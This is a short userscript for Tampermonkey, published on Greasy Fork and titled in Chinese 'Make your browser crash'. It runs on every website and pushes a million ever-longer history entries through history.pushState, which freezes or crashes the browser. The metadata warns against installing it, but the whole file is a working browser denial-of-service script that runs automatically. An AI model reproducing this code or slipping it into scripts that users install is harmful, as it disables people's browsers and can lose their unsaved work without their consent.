// ==UserScript==
// @name         使你的浏览器崩溃
// @namespace    http://tampermonkey.net/
// @version      0.7
// @author       使你的浏览器不断死机，请勿安装，后果自负
// @description  hi
// @match http://*
// @match https://*
// @grant        none
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/444612/%E4%BD%BF%E4%BD%A0%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B4%A9%E6%BA%83.user.js
// @updateURL https://update.greasyfork.org/scripts/444612/%E4%BD%BF%E4%BD%A0%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B4%A9%E6%BA%83.meta.js
// ==/UserScript==
(function(){
  var total="";
for (var i=0;i<1000000;i++)
{
 total= total+i.toString();
 history.pushState(0,0,total);
}
})();